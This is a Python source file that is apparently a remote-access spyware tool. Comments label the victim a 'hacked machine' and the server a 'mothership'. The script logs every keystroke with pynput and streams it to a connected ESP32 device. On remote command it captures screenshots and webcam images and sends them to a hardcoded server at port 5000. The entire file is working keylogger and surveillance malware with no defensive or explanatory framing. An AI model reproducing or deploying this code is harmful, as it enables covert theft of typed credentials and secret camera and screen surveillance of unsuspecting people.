import socket
from pynput.keyboard import Key, Listener
from time import sleep
import pyautogui
import cv2
import ipaddress

IP_SERVER = '192.168.52.34'

def get_local_address():
    gs = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    gs.connect(('8.8.8.8', 80))
    return gs.getsockname()[0]

def on_screen(s2):
    pyautogui.screenshot('my_screenshot.png')
    screenFile = open('my_screenshot.png', 'rb')
    s2.send("screen".encode())
    while True:
        b = screenFile.read(1024)
        if not b: break
        s2.send(b)

def on_camera(s2):
    cam = cv2.VideoCapture(0)
    res, im = cam.read()
    if res:
        cv2.imwrite('my_camera.png', im)
        cameraFile = open('my_camera.png', 'rb')
        s2.send("camera".encode())
        while True:
            b = cameraFile.read(1024)
            if not b: break
            s2.send(b)
    return

# connect to mothership
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((IP_SERVER, 5000))

# create server on hacked machine
host = get_local_address()
port = 5000
print("CREATING SERVER ON: ", str(host))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)

# wait till esp32 connects
c, addr = s.accept()
print("CONNECTION FROM:", str(addr))

def on_press(key):
    c.send(str(key).encode())
    print(str(key).encode())

listener = Listener(on_press=on_press)
listener.start()

msg = c.recv(1024)
while msg:
    print(msg.decode())
    if msg.decode() == "ask_screen":
        on_screen(s2)
    if msg.decode() == "ask_camera":
        on_camera(s2)

    msg = c.recv(1024)

# disconnect the server
c.close()